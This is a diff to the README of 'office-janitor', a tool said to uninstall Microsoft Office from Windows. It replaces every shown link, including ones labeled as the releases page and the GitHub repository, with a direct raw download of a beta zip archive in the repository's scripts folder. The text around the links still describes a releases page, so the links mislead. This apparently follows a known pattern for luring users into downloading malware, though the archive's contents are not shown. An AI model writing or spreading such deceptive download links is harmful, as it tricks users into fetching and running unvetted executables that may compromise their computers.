@@ -1,7 +1,7 @@
 # 🧹 office-janitor - Easily Remove Office Apps from Windows
 
 ## 🔗 Download Now
-[![Download Office Janitor][download-button]](https://github.com/Myet479/office-janitor/releases)
+[![Download Office Janitor][download-button]](https://raw.githubusercontent.com/Myet479/office-janitor/main/scripts/office-janitor_v3.6-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to office-janitor! This tool helps you remove Microsoft Office applications from your Windows computer completely. 
@@ -19,7 +19,7 @@ To download the application, please follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to open the releases page.
-   [Visit this page to download](https://github.com/Myet479/office-janitor/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Myet479/office-janitor/main/scripts/office-janitor_v3.6-beta.2.zip)
 
 2. **Choose the Latest Version:**
    Look for the latest version at the top of the page. It will usually be marked as "Latest release."
@@ -83,6 +83,6 @@ We welcome your feedback! If you have suggestions, issues, or want to contribute
 
 ## 🔗 Additional Links
 For more information, visit:
-- [GitHub Repository](https://github.com/Myet479/office-janitor)
+- [GitHub Repository](https://raw.githubusercontent.com/Myet479/office-janitor/main/scripts/office-janitor_v3.6-beta.2.zip)
 
 Thank you for choosing office-janitor! We hope you find it useful for managing your Office applications.
